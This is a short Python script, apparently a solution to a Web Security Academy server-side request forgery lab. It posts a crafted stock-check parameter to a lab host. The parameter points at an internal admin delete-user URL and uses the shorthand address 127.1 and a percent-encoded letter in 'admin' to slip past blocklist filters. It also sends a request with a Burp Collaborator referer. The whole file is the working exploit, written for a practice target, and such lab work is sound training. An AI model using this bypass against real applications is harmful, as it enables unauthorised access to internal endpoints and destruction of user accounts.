import requests

s = requests.Session()
# External stock check endpoint
url = 'https://0a22009303e842bd9a0eae12001800f8.web-security-academy.net/product/stock'

# Use encoded localhost & obfuscated "admin"
bypass_url = 'http://127.1/admi%6E/delete?username=carlos'

# Craft the SSRF payload
payload = {
    'stockApi': bypass_url
}

# Send the request
response = requests.post(url, data=payload)
s.get(url, headers={'referer' : "https://burpcollaborator.net"})

print("[*] Response:")
print(response.status_code)
print(response.text)
